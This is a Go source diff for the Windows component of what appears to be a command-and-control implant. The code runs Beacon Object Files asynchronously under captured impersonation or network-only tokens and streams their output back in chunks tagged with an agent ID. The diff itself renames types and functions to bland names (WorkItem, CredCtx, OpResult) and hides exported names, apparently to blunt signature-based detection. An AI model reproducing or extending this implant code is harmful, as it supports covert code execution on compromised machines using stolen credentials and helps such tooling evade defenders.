@@ -30,20 +30,20 @@ const (
 	MAX_TOTAL_OUTPUT      = 10 * 1024 * 1024 // 10MB max total output
 )
 
-// TokenContext stores token information for BOF execution
-type TokenContext struct {
+// CredCtx stores token information for BOF execution
+type CredCtx struct {
 	IsImpersonating bool
 	ActiveToken     string
 	NetOnlyToken    string
 	NetOnlyHandle   syscall.Handle
 }
 
-// BOFJob represents an async BOF execution job
-type BOFJob struct {
+// WorkItem represents an async BOF execution job
+type WorkItem struct {
 	ID              string
-	CommandID       string
-	CommandDBID     int
-	AgentID         string
+	CID       string
+	DID     int
+	AID         string
 	Name            string
 	Status          string // "running", "completed", "crashed", "killed", "timeout"
 	StartTime       time.Time
@@ -54,23 +54,23 @@ type BOFJob struct {
 	Args            []byte
 	CancelChan      chan bool
 	OutputMutex     sync.Mutex
-	Command         Command
+	Cmd         Msg
 	ChunkIndex      int
 	TotalBytesSent  int
 	QueuedChunks    int
 	OutputTruncated bool          // Flag if output was truncated
-	TokenContext    *TokenContext // Store token context for this job
+	CredCtx    *CredCtx // Store token context for this job
 }
 
-// BOFJobManager manages async BOF jobs
-type BOFJobManager struct {
-	jobs         map[string]*BOFJob
+// WorkManager manages async BOF jobs
+type WorkManager struct {
+	jobs         map[string]*WorkItem
 	mu           sync.RWMutex
-	commandQueue *CommandQueue
+	commandQueue *WorkQueue
 }
 
-var bofJobManager = &BOFJobManager{
-	jobs: make(map[string]*BOFJob),
+var bofJobManager = &WorkManager{
+	jobs: make(map[string]*WorkItem),
 }
 
 // generateJobID creates a unique job ID
@@ -83,13 +83,13 @@ func generateJobID() string {
 	return hex.EncodeToString(b)
 }
 
-// SetCommandQueue sets the command queue reference
-func (bjm *BOFJobManager) SetCommandQueue(cq *CommandQueue) {
+// setCommandQueue sets the command queue reference
+func (bjm *WorkManager) setCommandQueue(cq *WorkQueue) {
 	bjm.commandQueue = cq
 }
 
 // captureCurrentTokenContext captures the current token context for async execution
-func captureCurrentTokenContext() *TokenContext {
+func captureCurrentTokenContext() *CredCtx {
 	if globalTokenStore == nil {
 		return nil
 	}
@@ -97,7 +97,7 @@ func captureCurrentTokenContext() *TokenContext {
 	globalTokenStore.mu.RLock()
 	defer globalTokenStore.mu.RUnlock()
 
-	return &TokenContext{
+	return &CredCtx{
 		IsImpersonating: globalTokenStore.IsImpersonating,
 		ActiveToken:     globalTokenStore.ActiveToken,
 		NetOnlyToken:    globalTokenStore.NetOnlyToken,
@@ -107,7 +107,7 @@ func captureCurrentTokenContext() *TokenContext {
 
 // applyTokenContextWithDuplication applies the stored token context using token duplication
 // This ensures each async BOF gets its own token handle that can be safely managed
-func applyTokenContextWithDuplication(tokenContext *TokenContext) (func(), syscall.Handle) {
+func applyTokenContextWithDuplication(tokenContext *CredCtx) (func(), syscall.Handle) {
 	if tokenContext == nil || globalTokenStore == nil {
 		return func() {}, 0 // No-op cleanup
 	}
@@ -204,7 +204,7 @@ func applyTokenContextWithDuplication(tokenContext *TokenContext) (func(), sysca
 }
 
 // executeBOFAsyncPlatform is the Windows implementation for async BOF
-func executeBOFAsyncPlatform(cmd Command, bofBytes []byte, args []byte) CommandResult {
+func executeBOFAsyncPlatform(cmd Msg, bofBytes []byte, args []byte) OpResult {
 	jobID := generateJobID()
 
 	// Capture current token context before starting the job
@@ -213,20 +213,20 @@ func executeBOFAsyncPlatform(cmd Command, bofBytes []byte, args []byte) CommandR
 	// Get status string from template
 	statusRunning := bofStatusRunning()
 
-	job := &BOFJob{
+	job := &WorkItem{
 		ID:           jobID,
-		CommandID:    cmd.CommandID,
-		CommandDBID:  cmd.CommandDBID,
-		AgentID:      cmd.AgentID,
+		CID:    cmd.CID,
+		DID:  cmd.DID,
+		AID:      cmd.AID,
 		Name:         cmd.Filename,
 		Status:       statusRunning,
 		StartTime:    time.Now(),
 		BOFBytes:     bofBytes,
 		Args:         args,
 		CancelChan:   make(chan bool, 1),
-		Command:      cmd,
+		Cmd:      cmd,
 		ChunkIndex:   0,
-		TokenContext: tokenContext, // Store captured token context
+		CredCtx: tokenContext, // Store captured token context
 	}
 
 	bofJobManager.mu.Lock()
@@ -240,16 +240,16 @@ func executeBOFAsyncPlatform(cmd Command, bofBytes []byte, args []byte) CommandR
 	asyncStarted := bofAsyncStarted()
 	pipeSep := bofPipeSep()
 
-	return CommandResult{
-		Command:  cmd,
+	return OpResult{
+		Cmd:  cmd,
 		Output:   asyncStarted + pipeSep + jobID + pipeSep + cmd.Filename,
-		ExitCode: 0,
+		EC: 0,
 		JobID:    jobID,
 	}
 }
 
 // executeBOFAsync runs the BOF in a separate goroutine
-func (bjm *BOFJobManager) executeBOFAsync(job *BOFJob) {
+func (bjm *WorkManager) executeBOFAsync(job *WorkItem) {
 	// Get template strings
 	statusCrashed := bofStatusCrashed()
 	statusCompleted := bofStatusCompleted()
@@ -270,27 +270,27 @@ func (bjm *BOFJobManager) executeBOFAsync(job *BOFJob) {
 			crashMsg := "\n" + ErrCtx(E51, fmt.Sprintf("%v", r)) + "\n"
 			job.Output.WriteString(crashMsg)
 
-			// Queue final chunk using ResultManager
+			// Queue final chunk using OutputManager
 			bjm.queueOutputChunk(job, job.Output.String(), true)
 			job.OutputMutex.Unlock()
 		}
 	}()
 
-	// Send start notification through ResultManager
+	// Send start notification through OutputManager
 	startMsg := asyncStarted + pipeSep + job.ID + pipeSep + job.Name
-	startResult := &CommandResult{
-		Command: Command{
-			Command:     cmdAsyncStatus,
-			CommandID:   job.CommandID,
-			CommandDBID: job.CommandDBID,
-			AgentID:     job.AgentID,
+	startResult := &OpResult{
+		Cmd: Msg{
+			Cmd:     cmdAsyncStatus,
+			CID:   job.CID,
+			DID: job.DID,
+			AID:     job.AID,
 		},
 		Output:      startMsg,
-		ExitCode:    0,
-		CompletedAt: time.Now().Format(time.RFC3339),
+		EC:    0,
+		Done: time.Now().Format(time.RFC3339),
 		JobID:       job.ID,
 	}
-	resultManager.AddResult(startResult)
+	resultManager.addResult(startResult)
 
 	// Create channels for coordination
 	bofDone := make(chan struct{})
@@ -303,9 +303,9 @@ func (bjm *BOFJobManager) executeBOFAsync(job *BOFJob) {
 
 
 	// Log token context
-	if job.TokenContext != nil {
-		if job.TokenContext.NetOnlyHandle != 0 {
-		} else if job.TokenContext.IsImpersonating {
+	if job.CredCtx != nil {
+		if job.CredCtx.NetOnlyHandle != 0 {
+		} else if job.CredCtx.IsImpersonating {
 		}
 	}
 
@@ -364,7 +364,7 @@ func (bjm *BOFJobManager) executeBOFAsync(job *BOFJob) {
 						job.Output.Reset()
 						job.OutputMutex.Unlock()
 
-						// Queue the chunk through ResultManager
+						// Queue the chunk through OutputManager
 						bjm.queueOutputChunk(job, chunk, false)
 						lastChunkTime = time.Now()
 						job.TotalBytesSent += len(chunk)
@@ -383,7 +383,7 @@ func (bjm *BOFJobManager) executeBOFAsync(job *BOFJob) {
 					job.OutputMutex.Unlock()
 
 
-					// Queue the chunk through ResultManager
+					// Queue the chunk through OutputManager
 					bjm.queueOutputChunk(job, chunk, false)
 					lastChunkTime = time.Now()
 					job.TotalBytesSent += size
@@ -424,7 +424,7 @@ func (bjm *BOFJobManager) executeBOFAsync(job *BOFJob) {
 		err    error
 	}, 1)
 
-	// Execute BOF in separate goroutine with duplicated token
+	// execute BOF in separate goroutine with duplicated token
 	go func() {
 		// Lock this goroutine to its OS thread so token impersonation
 		// (which is per-thread) is not lost to goroutine migration.
@@ -433,7 +433,7 @@ func (bjm *BOFJobManager) executeBOFAsync(job *BOFJob) {
 		defer closeBofDone.Do(func() { close(bofDone) })
 
 		// Duplicate and apply token context for this BOF execution
-		cleanupToken, duplicatedTokenHandle := applyTokenContextWithDuplication(job.TokenContext)
+		cleanupToken, duplicatedTokenHandle := applyTokenContextWithDuplication(job.CredCtx)
 		defer cleanupToken()
 
 
@@ -446,14 +446,14 @@ func (bjm *BOFJobManager) executeBOFAsync(job *BOFJob) {
 		if duplicatedTokenHandle != 0 {
 			// For network-only tokens, DON'T clear SMB sessions aggressively
 			// Only clear if this is the first time accessing this resource
-			if job.TokenContext != nil && job.TokenContext.NetOnlyHandle != 0 {
+			if job.CredCtx != nil && job.CredCtx.NetOnlyHandle != 0 {
 				networkPath := parseBOFNetworkPath(job.Args)
 				if networkPath != "" {
 					// Only log that we're using network path
 
 					// Track this resource for later cleanup (but don't disconnect now)
 					if networkResourceTracker != nil {
-						networkResourceTracker.TrackNetworkResource(networkPath)
+						networkResourceTracker.trackNetworkResource(networkPath)
 					}
 				}
 			}
@@ -467,7 +467,7 @@ func (bjm *BOFJobManager) executeBOFAsync(job *BOFJob) {
 			}
 		}
 
-		// Execute the BOF with async timeout (30 minutes)
+		// execute the BOF with async timeout (30 minutes)
 		// IMPORTANT: The impersonation must be active during this call
 		output, err := LoadWithTimeout(job.BOFBytes, job.Args, 30*time.Minute)
 
@@ -514,7 +514,7 @@ func (bjm *BOFJobManager) executeBOFAsync(job *BOFJob) {
 		finalOutput := job.Output.String()
 		job.OutputMutex.Unlock()
 
-		// Queue final chunk through ResultManager
+		// Queue final chunk through OutputManager
 		bjm.queueOutputChunk(job, finalOutput, true)
 
 
@@ -530,7 +530,7 @@ func (bjm *BOFJobManager) executeBOFAsync(job *BOFJob) {
 		finalOutput := job.Output.String()
 		job.OutputMutex.Unlock()
 
-		// Queue final chunk through ResultManager
+		// Queue final chunk through OutputManager
 		bjm.queueOutputChunk(job, finalOutput, true)
 
 	case <-time.After(30 * time.Minute):
@@ -545,14 +545,14 @@ func (bjm *BOFJobManager) executeBOFAsync(job *BOFJob) {
 		finalOutput := job.Output.String()
 		job.OutputMutex.Unlock()
 
-		// Queue final chunk through ResultManager
+		// Queue final chunk through OutputManager
 		bjm.queueOutputChunk(job, finalOutput, true)
 	}
 
 }
 
-// queueOutputChunk adds chunks to the regular ResultManager with batching
-func (bjm *BOFJobManager) queueOutputChunk(job *BOFJob, output string, isFinal bool) {
+// queueOutputChunk adds chunks to the regular OutputManager with batching
+func (bjm *WorkManager) queueOutputChunk(job *WorkItem, output string, isFinal bool) {
 	if len(output) == 0 && !isFinal {
 		return
 	}
@@ -613,21 +613,21 @@ func (bjm *BOFJobManager) queueOutputChunk(job *BOFJob, output string, isFinal b
 			// Combine batched chunks into single result
 			combinedOutput := strings.Join(batchedChunks, chunkSeparator)
 
-			result := &CommandResult{
-				Command: Command{
-					Command:     cmdAsyncOutput,
-					CommandID:   job.CommandID,
-					CommandDBID: job.CommandDBID,
-					AgentID:     job.AgentID,
+			result := &OpResult{
+				Cmd: Msg{
+					Cmd:     cmdAsyncOutput,
+					CID:   job.CID,
+					DID: job.DID,
+					AID:     job.AID,
 				},
 				Output:      combinedOutput,
-				ExitCode:    0,
-				CompletedAt: time.Now().Format(time.RFC3339),
+				EC:    0,
+				Done: time.Now().Format(time.RFC3339),
 				JobID:       job.ID,
 			}
 
-			// Add to ResultManager
-			if err := resultManager.AddResult(result); err != nil {
+			// Add to OutputManager
+			if err := resultManager.addResult(result); err != nil {
 			} else {
 			}
 
@@ -642,20 +642,20 @@ func (bjm *BOFJobManager) queueOutputChunk(job *BOFJob, output string, isFinal b
 	}
 }
 
-// GetPendingResults returns empty since we use ResultManager now
-func (bjm *BOFJobManager) GetPendingResults() []CommandResult {
-	return []CommandResult{}
+// getPendingResults returns empty since we use OutputManager now
+func (bjm *WorkManager) getPendingResults() []OpResult {
+	return []OpResult{}
 }
 
 // executeBOFJobsList lists all BOF jobs
-func executeBOFJobsList() CommandResult {
-	jobs := bofJobManager.ListJobs()
+func executeBOFJobsList() OpResult {
+	jobs := bofJobManager.listJobs()
 
 	if len(jobs) == 0 {
-		return CommandResult{
+		return OpResult{
 			Output:      Succ(S0),
-			ExitCode:    0,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    0,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
@@ -692,9 +692,9 @@ func executeBOFJobsList() CommandResult {
 		job.OutputMutex.Unlock()
 	}
 
-	return CommandResult{
+	return OpResult{
 		Output:   output.String(),
-		ExitCode: 0,
+		EC: 0,
 	}
 }
 
@@ -710,9 +710,9 @@ func truncateString(s string, maxLen int) string {
 }
 
 // executeBOFGetOutput retrieves output from a BOF job
-func executeBOFGetOutput(jobID string) CommandResult {
-	var matchedJob *BOFJob
-	jobs := bofJobManager.ListJobs()
+func executeBOFGetOutput(jobID string) OpResult {
+	var matchedJob *WorkItem
+	jobs := bofJobManager.listJobs()
 
 	for _, job := range jobs {
 		if job.ID == jobID || strings.HasPrefix(job.ID, jobID) {
@@ -722,10 +722,10 @@ func executeBOFGetOutput(jobID string) CommandResult {
 	}
 
 	if matchedJob == nil {
-		return CommandResult{
+		return OpResult{
 			Output:      ErrCtx(E47, jobID),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
@@ -767,17 +767,17 @@ func executeBOFGetOutput(jobID string) CommandResult {
 		output = outputForJob + matchedJob.ID + chunksSentParen + fmt.Sprintf("%d", chunks) + closeParen + truncatedMsgOutput + closeColonNL + output
 	}
 
-	return CommandResult{
+	return OpResult{
 		Output:   output,
-		ExitCode: 0,
+		EC: 0,
 		JobID:    jobID,
 	}
 }
 
 // executeBOFKillJob kills a running BOF job
-func executeBOFKillJob(jobID string) CommandResult {
-	var matchedJob *BOFJob
-	jobs := bofJobManager.ListJobs()
+func executeBOFKillJob(jobID string) OpResult {
+	var matchedJob *WorkItem
+	jobs := bofJobManager.listJobs()
 
 	for _, job := range jobs {
 		if job.ID == jobID || strings.HasPrefix(job.ID, jobID) {
@@ -787,55 +787,55 @@ func executeBOFKillJob(jobID string) CommandResult {
 	}
 
 	if matchedJob == nil {
-		return CommandResult{
+		return OpResult{
 			Output:      ErrCtx(E47, jobID),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
 	statusRunning := bofStatusRunning()
 
 	if matchedJob.Status != statusRunning {
-		return CommandResult{
+		return OpResult{
 			Output:      ErrCtx(E25, matchedJob.Status),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
 	select {
 	case matchedJob.CancelChan <- true:
 		time.Sleep(100 * time.Millisecond)
-		return CommandResult{
+		return OpResult{
 			Output:      SuccCtx(S2, matchedJob.ID),
-			ExitCode:    0,
+			EC:    0,
 			JobID:       jobID,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			Done: time.Now().Format(time.RFC3339),
 		}
 	default:
-		return CommandResult{
+		return OpResult{
 			Output:      Err(E25),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 }
 
-// ListJobs returns all BOF jobs
-func (bjm *BOFJobManager) ListJobs() []*BOFJob {
+// listJobs returns all BOF jobs
+func (bjm *WorkManager) listJobs() []*WorkItem {
 	bjm.mu.RLock()
 	defer bjm.mu.RUnlock()
 
-	jobs := make([]*BOFJob, 0, len(bjm.jobs))
+	jobs := make([]*WorkItem, 0, len(bjm.jobs))
 	for _, job := range bjm.jobs {
 		jobs = append(jobs, job)
 	}
 	return jobs
 }
 
-// CleanupOldJobs removes old completed jobs
-func (bjm *BOFJobManager) CleanupOldJobs(maxAge time.Duration) {
+// cleanupOldJobs removes old completed jobs
+func (bjm *WorkManager) cleanupOldJobs(maxAge time.Duration) {
 	bjm.mu.Lock()
 	defer bjm.mu.Unlock()
 
@@ -851,8 +851,8 @@ func (bjm *BOFJobManager) CleanupOldJobs(maxAge time.Duration) {
 	}
 }
 
-// GetJob retrieves a specific job
-func (bjm *BOFJobManager) GetJob(jobID string) (*BOFJob, bool) {
+// getJob retrieves a specific job
+func (bjm *WorkManager) getJob(jobID string) (*WorkItem, bool) {
 	bjm.mu.RLock()
 	defer bjm.mu.RUnlock()
 
@@ -867,7 +867,7 @@ func init() {
 		defer ticker.Stop()
 
 		for range ticker.C {
-			bofJobManager.CleanupOldJobs(24 * time.Hour)
+			bofJobManager.cleanupOldJobs(24 * time.Hour)
 		}
 	}()
 }
